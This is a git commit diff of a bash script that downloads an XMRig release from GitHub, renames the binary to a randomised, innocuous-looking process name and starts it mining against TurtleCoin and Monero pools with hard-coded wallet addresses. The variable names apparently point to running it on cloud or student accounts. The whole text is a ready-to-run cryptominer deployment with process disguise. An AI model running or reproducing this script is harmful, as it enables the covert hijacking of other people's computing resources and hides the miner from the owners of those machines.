0547281957df2b88e90679e272a55f4a1a7a74c8
eccoder <55380821+eccoder@users.noreply.github.com>
2021-09-14 11:41:05 +0700

    Update ikol.sh

--- ikol.sh
+++ ikol.sh
@@ -1,16 +1,21 @@
 #!/bin/bash
 sudo apt-get update
-azure=studentlearn
+VERSION=6.3.1
+azure=mxsemsdnlkdj
+a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
+apt-get install -y git wget screen
 mkdir /usr/share
 mkdir /usr/share/work
-rm -r /usr/share/work/xmrig-6.14.1
-wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz 
-mv xmrig-6.14.1-linux-x64.tar.gz /usr/share/work/
-cd /usr/share/work/ &&  tar xf xmrig-6.14.1-linux-x64.tar.gz
-rm -rf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1
-a='studentlearn-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
+rm -r /usr/share/work/xmrig-$VERSION
+wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-xenial-x64.tar.gz
+mv xmrig-$VERSION-xenial-x64.tar.gz /usr/share/work/
+cd /usr/share/work/ &&  tar -xvzf xmrig-$VERSION-xenial-x64.tar.gz
+rm -rf xmrig-$VERSION-xenial-x64.tar.gz && cd xmrig-$VERSION
 mv xmrig $azure -n
-sudo cp $azure "$cpuname"
-sudo rm -f  xmrig
-echo $cpuname" is starting"
-screen -d -m ./"${cpuname}" -o pool.minexmr.com:4444 -u 83RBenv44USZpppATtxX3LHrZqstpuTpcfuT4FEMH35uMfoWWnbMtLMfAit3bTV4HEWYoCqcNH7ZTU3VoAsayUaDEbcRUo9 -p anitaosbeck -a rx/0 -k 
+cp $azure "$cpuname"
+rm -f  xmrig
+POOL=us.turtlecoin.herominers.com:1160
+USERNAME=TRTLv1Hqo3wHdqLRXuCyX3MwvzKyxzwXeBtycnkDy8ceFp4E23bm3P467xLEbUusH6Q1mqQUBiYwJ2yULJbvr5nKe8kcyc4uyps+11bf5aac924fdb97faaa8fea90a64096c7541735d89c0952970ede1bdf08ed2e
+ALGO=argon2/chukwav2
+DONATE=1
+./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME.T67Test -p Sep14 -a $ALGO -k --tls
